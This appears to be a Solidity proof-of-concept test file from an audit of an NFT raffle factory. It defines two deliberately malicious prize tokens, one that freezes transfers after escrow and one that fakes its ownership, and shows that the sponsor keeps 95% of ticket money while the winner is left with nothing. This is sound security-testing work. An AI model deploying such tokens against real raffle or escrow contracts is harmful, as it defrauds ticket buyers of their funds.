// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import { RaffleFactory } from "../../src/RaffleFactory.sol";
import { IRaffle } from "../../src/interfaces/IRaffle.sol";
import { IRaffleFactory } from "../../src/interfaces/IRaffleFactory.sol";

interface Vm {
    function prank(address caller) external;
    function warp(uint256 newTimestamp) external;
}

interface IRawVrfConsumer {
    function rawFulfillRandomWords(uint256 requestId, uint256[] calldata randomWords) external;
}

contract MockUSDC is IERC20Metadata {
    string public constant override name = "Mock USDC";
    string public constant override symbol = "mUSDC";
    uint8 public constant override decimals = 6;

    uint256 public override totalSupply;
    mapping(address account => uint256 amount) public override balanceOf;
    mapping(address owner => mapping(address spender => uint256 amount)) public override allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        require(currentAllowance >= amount, "allowance");
        if (currentAllowance != type(uint256).max) {
            allowance[from][msg.sender] = currentAllowance - amount;
            emit Approval(from, msg.sender, currentAllowance - amount);
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "zero recipient");
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract MockVrfWrapper {
    uint256 public lastRequestId;

    function link() external pure returns (address) {
        return address(1);
    }

    function linkNativeFeed() external pure returns (address) {
        return address(1);
    }

    function calculateRequestPrice(uint32, uint32) external pure returns (uint256) {
        return 0;
    }

    function calculateRequestPriceNative(uint32, uint32) external pure returns (uint256) {
        return 0;
    }

    function estimateRequestPrice(uint32, uint32, uint256) external pure returns (uint256) {
        return 0;
    }

    function estimateRequestPriceNative(uint32, uint32, uint256) external pure returns (uint256) {
        return 0;
    }

    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata)
        external
        payable
        returns (uint256 requestId)
    {
        requestId = ++lastRequestId;
    }

    function fulfill(address consumer, uint256 requestId, uint256 randomWord) external {
        uint256[] memory words = new uint256[](1);
        words[0] = randomWord;
        IRawVrfConsumer(consumer).rawFulfillRandomWords(requestId, words);
    }
}

/// @dev Behaves honestly through escrow, then lets its sponsor/controller make every outbound transfer revert forever.
contract IrreversiblyPausablePrize is ERC721 {
    error OutboundTransfersFrozen();
    error OnlyController();

    address public immutable controller;
    bool public frozenForever;

    constructor() ERC721("Sponsor Prize", "SPONSOR") {
        controller = msg.sender;
    }

    function mint(address to, uint256 tokenId) external {
        if (msg.sender != controller) revert OnlyController();
        _mint(to, tokenId);
    }

    function freezeOutboundForever() external {
        if (msg.sender != controller) revert OnlyController();
        frozenForever = true;
    }

    function transferFrom(address from, address to, uint256 tokenId) public override {
        if (frozenForever) revert OutboundTransfersFrozen();
        super.transferFrom(from, to, tokenId);
    }
}

/// @dev Calls the receiver hook and self-reports the clone as owner without changing its underlying ERC-721 owner.
contract SelfAttestingPrize is ERC721 {
    error PhantomPrizeCannotMove();
    error UnauthorizedPhantomDeposit();
    error ReceiverRejectedPhantomPrize();

    mapping(uint256 tokenId => address reportedOwner) private _reportedOwner;

    constructor() ERC721("Self Attesting Prize", "PHANTOM") { }

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }

    function actualOwnerOf(uint256 tokenId) external view returns (address) {
        return _ownerOf(tokenId);
    }

    function ownerOf(uint256 tokenId) public view override returns (address) {
        address reported = _reportedOwner[tokenId];
        return reported == address(0) ? super.ownerOf(tokenId) : reported;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public override {
        address actualOwner = _ownerOf(tokenId);
        if (actualOwner != from || (msg.sender != actualOwner && getApproved(tokenId) != msg.sender)) {
            revert UnauthorizedPhantomDeposit();
        }

        // Deliberately do not call super or update ERC-721 storage.
        _reportedOwner[tokenId] = to;
        bytes4 accepted = IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data);
        if (accepted != IERC721Receiver.onERC721Received.selector) revert ReceiverRejectedPhantomPrize();
    }

    function transferFrom(address from, address to, uint256 tokenId) public override {
        if (_reportedOwner[tokenId] != address(0)) revert PhantomPrizeCannotMove();
        super.transferFrom(from, to, tokenId);
    }
}

contract UntrustedPrizeProofTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    uint256 private constant ENTRY_PRICE = 1_000_000;
    uint256 private constant PRIZE_ID = 777;
    address private constant BUYER = address(0xB0B);
    address private constant SPONSOR_RECIPIENT = address(0x5A0B50A);
    address private constant PROTOCOL_TREASURY = address(0xFEE);

    MockUSDC private usdc;
    MockVrfWrapper private wrapper;
    RaffleFactory private factory;

    function setUp() public {
        usdc = new MockUSDC();
        wrapper = new MockVrfWrapper();
        factory = new RaffleFactory(address(usdc), address(wrapper), PROTOCOL_TREASURY);
    }

    function test_postEscrowFreezeLetsSponsorTake95PercentWhileWinnerGetsNeitherPrizeNorRefund() public {
        IrreversiblyPausablePrize prize = new IrreversiblyPausablePrize();
        prize.mint(address(this), PRIZE_ID);
        prize.approve(address(factory), PRIZE_ID);

        uint64 endTime = uint64(block.timestamp + 1 days);
        IRaffle raffle = IRaffle(
            factory.createRaffle(
                IRaffleFactory.CreateRaffleParams({
                    sponsorRecipient: SPONSOR_RECIPIENT,
                    prizeToken: address(prize),
                    prizeTokenId: PRIZE_ID,
                    reserveEntries: 1,
                    endTime: endTime
                })
            )
        );

        // The primary proof uses a real, standards-compliant escrow before the sponsor freezes transfers.
        require(prize.ownerOf(PRIZE_ID) == address(raffle), "prize was not honestly escrowed");
        require(raffle.status() == IRaffle.Status.Active, "raffle did not activate");
        prize.freezeOutboundForever();

        usdc.mint(BUYER, ENTRY_PRICE);
        vm.prank(BUYER);
        usdc.approve(address(raffle), ENTRY_PRICE);
        vm.prank(BUYER);
        uint256 ticketId = raffle.buyEntries(BUYER, 1);

        vm.warp(endTime);
        uint256 requestId = raffle.requestDraw();
        wrapper.fulfill(address(raffle), requestId, 0);
        require(raffle.status() == IRaffle.Status.NftWon, "expected NftWon");
        require(raffle.winningEntry() == 1, "wrong winning entry");

        uint256 cashAmount = raffle.settleWinningTicket(ticketId);
        require(cashAmount == 0, "NFT outcome unexpectedly allocated winner cash");
        require(raffle.settlementComplete(), "settlement incomplete");
        require(raffle.sponsorProceeds() == 950_000, "wrong sponsor allocation");
        require(raffle.protocolFees() == 50_000, "wrong protocol allocation");
        require(raffle.remainingRefundLiability() == 0, "unexpected refund liability");

        require(raffle.releaseSponsorProceeds() == 950_000, "wrong sponsor release");
        require(raffle.releaseProtocolFees() == 50_000, "wrong protocol release");
        require(usdc.balanceOf(SPONSOR_RECIPIENT) == 950_000, "sponsor did not receive 95 percent");
        require(usdc.balanceOf(PROTOCOL_TREASURY) == 50_000, "protocol did not receive 5 percent");
        require(usdc.balanceOf(address(raffle)) == 0, "raffle retained quote token");

        vm.prank(BUYER);
        (bool redeemed, bytes memory redemptionError) =
            address(raffle).call(abi.encodeCall(IRaffle.redeemWinningTicket, (ticketId)));
        require(!redeemed, "frozen prize unexpectedly redeemed");
        require(
            _selector(redemptionError) == IrreversiblyPausablePrize.OutboundTransfersFrozen.selector,
            "unexpected redemption revert"
        );

        // The failed transaction rolls back the burn/flags, but NftWon has no timeout-to-refund transition.
        require(!raffle.winnerRedeemed(), "failed redemption changed winnerRedeemed");
        require(!raffle.prizeClaimed(), "failed redemption changed prizeClaimed");
        require(IERC721(address(raffle)).ownerOf(ticketId) == BUYER, "failed redemption burned ticket");
        require(prize.ownerOf(PRIZE_ID) == address(raffle), "failed redemption moved prize");
        require(usdc.balanceOf(BUYER) == 0, "buyer was refunded unexpectedly");

        vm.warp(block.timestamp + 3650 days);
        vm.prank(BUYER);
        (bool redeemedYearsLater, bytes memory laterError) =
            address(raffle).call(abi.encodeCall(IRaffle.redeemWinningTicket, (ticketId)));
        require(!redeemedYearsLater, "time unexpectedly cured frozen redemption");
        require(
            _selector(laterError) == IrreversiblyPausablePrize.OutboundTransfersFrozen.selector,
            "unexpected late redemption revert"
        );

        (bool refundsEnabled, bytes memory refundError) =
            address(raffle).call(abi.encodeCall(IRaffle.enableRefunds, ()));
        require(!refundsEnabled, "NftWon unexpectedly transitioned to Refunding");
        require(_selector(refundError) == IRaffle.InvalidStatus.selector, "unexpected refund transition revert");
        require(raffle.status() == IRaffle.Status.NftWon, "terminal state changed");
        require(raffle.accountedQuoteBalance() == 0, "winner retained a quote-token claim");
    }

    function test_createRaffleTrustsPrizeTokensOwnCallbackAndOwnerOfSelfAttestation() public {
        SelfAttestingPrize prize = new SelfAttestingPrize();
        prize.mint(address(this), PRIZE_ID);
        prize.approve(address(factory), PRIZE_ID);

        IRaffle raffle = IRaffle(
            factory.createRaffle(
                IRaffleFactory.CreateRaffleParams({
                    sponsorRecipient: SPONSOR_RECIPIENT,
                    prizeToken: address(prize),
                    prizeTokenId: PRIZE_ID,
                    reserveEntries: 1,
                    endTime: uint64(block.timestamp + 1 days)
                })
            )
        );

        require(raffle.status() == IRaffle.Status.Active, "self-attested raffle did not activate");
        require(prize.ownerOf(PRIZE_ID) == address(raffle), "token did not self-attest clone ownership");
        require(prize.actualOwnerOf(PRIZE_ID) == address(this), "underlying ERC-721 owner actually changed");
    }

    function _selector(bytes memory revertData) private pure returns (bytes4 selector) {
        if (revertData.length < 4) return bytes4(0);
        assembly ("memory-safe") {
            selector := mload(add(revertData, 0x20))
        }
    }
}
